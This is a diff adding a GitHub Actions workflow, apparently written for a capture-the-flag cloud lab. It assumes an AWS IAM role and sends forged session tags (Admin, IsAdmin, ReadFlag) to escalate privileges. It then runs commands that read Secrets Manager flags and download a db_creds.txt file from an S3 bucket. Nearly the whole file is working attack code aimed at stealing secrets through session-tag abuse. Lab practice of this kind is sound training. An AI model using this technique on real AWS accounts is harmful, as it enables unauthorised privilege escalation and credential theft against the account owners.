@@ -1,0 +1,52 @@
+name: AWS STS Session Tags Exploit
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Configure AWS credentials with Session Tags
+        uses: aws-actions/configure-aws-credentials@v2
+        with:
+          role-to-assume: arn:aws:iam::067186171322:role/whitebox-lab-2-github-actions-role
+          aws-region: us-east-1
+          # This parameter will show a warning but still be processed!
+          role-session-tags: |
+            Key=Department,Value=Admin
+            Key=Role,Value=Admin
+            Key=ReadFlag,Value=true
+            Key=IsAdmin,Value=true
+            Key=admin,Value=true
+            Key=Administrator,Value=true
+            Key=lab,Value=Whitebox
+            Key=User,Value=Admin
+
+      - name: Get AWS Account Information
+        run: aws sts get-caller-identity
+
+      - name: Try to list secrets
+        run: aws secretsmanager list-secrets || echo "List secrets failed"
+
+      - name: Try to get flag_whitebox_lab_2_2
+        run: aws secretsmanager get-secret-value --secret-id flag_whitebox_lab_2_2 || echo "Get secret failed"
+
+      - name: Try other potential secret names
+        run: |
+          aws secretsmanager get-secret-value --secret-id flag_whitebox_lab_2 || echo "flag_whitebox_lab_2 failed"
+          aws secretsmanager get-secret-value --secret-id whitebox-lab-2-flag || echo "whitebox-lab-2-flag failed"
+          aws secretsmanager get-secret-value --secret-id github-flag || echo "github-flag failed"
+
+      - name: Try S3 access
+        run: |
+          aws s3 ls || echo "S3 list failed"
+          aws s3 cp s3://whitebox-lab-2-public-bucket-ctf-776931e5d54e/db_creds.txt - || echo "S3 download failed"
